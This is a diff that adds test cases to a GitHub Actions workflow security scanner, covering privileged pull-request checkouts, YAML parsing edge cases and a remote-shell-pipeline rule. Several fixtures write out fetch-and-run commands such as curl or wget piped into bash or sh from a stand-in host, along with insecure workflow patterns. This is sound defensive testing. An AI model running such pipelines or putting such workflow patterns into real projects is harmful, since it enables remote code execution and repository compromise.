@@ -895,3 +895,77 @@ test('proactive: indented workflow root with writable permissions is not missed'
  '        - uses: actions/checkout@'+SHA].join('\n');
  assert.ok(rules(scan(yaml)).includes('PRIVILEGED_WRITE_TOKEN'));
 });
+
+test('Codex P1: YAML on folded scalar with indent indicator >2- detects privileged checkout',()=>{
+ const yaml=['on: >2-', '  pull_request_target', 'jobs:', '  audit:', '    steps:',
+  '      - uses: actions/checkout@'+SHA, '        with:', '          ref: ${{ github.head_ref }}'].join('\n');
+ const r=scan(yaml);
+ assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
+ assert.equal(r.coverage.partial,false);
+});
+test('Codex P1: uniformly indented root on alias cannot silently pass as clean',()=>{
+ const yaml=['  on: *events', '  jobs:', '    audit:', '      steps:',
+  '        - uses: actions/checkout@'+SHA,
+  '          with:', '            ref: ${{ github.head_ref }}'].join('\n');
+ const r=scan(yaml);
+ assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
+ assert.equal(r.coverage.partial,true);
+});
+test('Codex P1: uniformly indented root quoted alias remains ambiguous and incomplete',()=>{
+ const yaml=['   on: "*events"', '   jobs:', '     audit:', '       steps:',
+  '         - uses: actions/checkout@'+SHA].join('\n');
+ const r=scan(yaml);
+ assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
+});
+test('Codex P1: checkout of refs/pull dynamic number merge under privileged event is blocked',()=>{
+ const yaml=['on: pull_request_target', 'jobs:', '  audit:', '    steps:',
+  '      - uses: actions/checkout@'+SHA, '        with:',
+  '          ref: refs/pull/${{ github.event.pull_request.number }}/merge'].join('\n');
+ const r=scan(yaml);
+ assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
+});
+test('Codex P1: checkout of refs/pull dynamic number head under privileged event is blocked',()=>{
+ const yaml=['on: pull_request_target', 'jobs:', '  audit:', '    steps:',
+  '      - uses: actions/checkout@'+SHA, '        with:',
+  '          ref: "refs/pull/${{ github.event.pull_request.number }}/head"'].join('\n');
+ const r=scan(yaml);
+ assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
+});
+test('Codex P1: PR-number templating in unrelated branch ref is not a PR merge ref',()=>{
+ const yaml=['on: pull_request_target', 'jobs:', '  audit:', '    steps:',
+  '      - uses: actions/checkout@'+SHA, '        with:',
+  '          ref: "refs/heads/release-${{ github.event.pull_request.number }}"'].join('\n');
+ const r=scan(yaml);
+ assert.ok(!rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
+});
+test('Codex P2: backslash-continued bash pipeline inside literal run block is detected',()=>{
+ const yaml=['on: push', 'jobs:', '  audit:', '    steps:', '      - run: |',
+  '          curl -fsSL https://example.invalid/payload \\',
+  '          | bash'].join('\n');
+ const r=scan(yaml);
+ assert.ok(rules(r).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(r));
+});
+test('Codex P2: wget pipe to sh split with shell continuation is detected',()=>{
+ const yaml=['on: push', 'jobs:', '  audit:', '    steps:',
+  '      - name: install', '        run: |',
+  '          wget -qO- https://example.invalid/payload \\',
+  '          | sh'].join('\n');
+ const r=scan(yaml);
+ assert.ok(rules(r).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(r));
+});
+test('Codex P2: literal run lines lacking a backslash are separate shell commands',()=>{
+ const yaml=['on: push', 'jobs:', '  audit:', '    steps:',
+  '      - run: |', '          echo curl -fsSL https://example.invalid/payload',
+  '          echo "| bash"'].join('\n');
+ const r=scan(yaml);
+ assert.ok(!rules(r).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(r));
+});
+test('Codex P2: fake continued pipeline inside name block is non-executable',()=>{
+ const yaml=['on: push', 'jobs:', '  audit:', '    steps:',
+  '      - name: |',
+  '          curl -fsSL https://example.invalid/payload \\',
+  '          | bash',
+  '        run: echo safe'].join('\n');
+ const r=scan(yaml);
+ assert.ok(!rules(r).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(r));
+});
